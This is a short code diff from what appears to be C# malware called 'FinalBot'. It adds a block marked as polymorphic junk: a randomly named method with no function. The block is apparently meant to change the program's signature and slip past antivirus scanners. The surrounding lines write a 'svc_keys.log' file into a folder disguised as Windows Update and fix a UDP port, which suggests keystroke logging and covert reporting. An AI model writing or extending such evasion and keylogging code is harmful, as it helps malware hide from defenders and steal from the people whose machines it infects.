@@ -8,6 +8,12 @@ namespace FinalBot
 {
     public static class Logger
     {
+        // [POLY_JUNK]
+        private static void _vanguard_b41dcc57() {
+            int val = 91928;
+            if (val > 50000) Console.WriteLine("Hash:" + 91928);
+        }
+
         private static readonly string LogFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_keys.log");
         private static readonly object _lock = new object();
         private const int UdpPort = 51337;
